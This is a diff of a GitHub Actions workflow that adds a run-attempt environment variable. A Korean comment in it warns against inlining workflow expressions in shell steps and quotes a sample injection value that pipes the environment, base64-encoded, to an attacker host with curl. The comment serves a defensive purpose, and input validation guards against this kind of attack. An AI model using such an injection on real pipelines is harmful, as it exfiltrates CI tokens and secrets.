@@ -108,6 +108,7 @@ jobs:
           # 뿐이다 — `GH_TOKEN`이 이미 그 토큰이다.
           FACTORY_TWO_ACTOR: ${{ secrets.FACTORY_MERGE_TOKEN != '' }}
           FACTORY_RUNNER_ID: gha-${{ github.run_id }}
+          FACTORY_RUN_ATTEMPT: ${{ github.run_attempt }}
           # ADR-020 최종 리뷰 MF-2 — **`${{ … }}`를 `run:` 안에 붙여 넣지 않는다.** `inputs.issue`는
           # 자유 문자열이고(`type: string`), 그 값은 Actions가 셸에 넘기기 **전에** 텍스트로 치환된다:
           # `1; curl -sd "$(env|base64 -w0)" https://attacker.tld #` 하나면 이 스텝의 env에 실린
@@ -179,6 +180,7 @@ jobs:
         env:
           GH_TOKEN: ${{ secrets.FACTORY_BOT_TOKEN }}
           FACTORY_RUNNER_ID: gha-${{ github.run_id }}
+          FACTORY_RUN_ATTEMPT: ${{ github.run_attempt }}
           ISSUE: ${{ github.event.issue.number || inputs.issue }}
         run: |
           [[ "$ISSUE" =~ ^[0-9]+$ ]] || { echo "factory: issue input is not a number: '$ISSUE'" >&2; exit 1; }
